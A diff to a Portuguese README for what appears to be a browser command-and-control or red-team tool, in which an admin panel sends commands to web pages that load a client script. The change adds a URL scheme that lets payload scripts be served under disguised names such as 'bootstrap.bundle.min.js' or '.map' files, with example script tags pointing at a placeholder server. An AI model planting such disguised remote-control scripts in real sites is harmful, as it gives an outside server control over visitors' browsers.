@@ -273,12 +273,27 @@ O painel administrativo moderno oferece várias opções para enviar comandos:
 
 Para integrar o sistema em páginas existentes, basta incluir o script cliente:
 
-**A instância do cmd.js garante a execução em uma página remota hospedada em outro servidor ou no cliente que baixa o arquivo .html em sua máquina.**
+**A instância do payload.js garante a execução em uma página remota hospedada em outro servidor ou no cliente que baixa o arquivo .html em sua máquina.**
 
+O sistema disponibiliza um esquema de **ID** e **nome de arquivo** dinâmicos, os arquivos de payload devem terminar com a extenção **.js** ou **.map**
+- `http://server:5000/<int>/<string>.js`
+- `http://server:5000/<int>/<string>.map`
+
+Exemplos:
 ```html
 <!-- Adicionar antes do fechamento do </body> -->
-<script src="http://seu-servidor:5000/js/cmd.js"></script>
+<script src="http://seu-servidor:5000/1/poc.js"></script>
+
+<script src="http://seu-servidor:5000/12345/teste.js"></script>
+
+<script src="http://seu-servidor:5000/99999/bootstrap.bundle.min.js"></script>
+
+<script src="http://seu-servidor:5000/99999/bootstrap.bundle.min.map"></script>
+
+<script src="http://seu-servidor:5000/2025/payload-campanha-redteam.js"></script>
 ```
+
+
 
 O sistema irá:
 1. Gerar automaticamente um ID único para o cliente
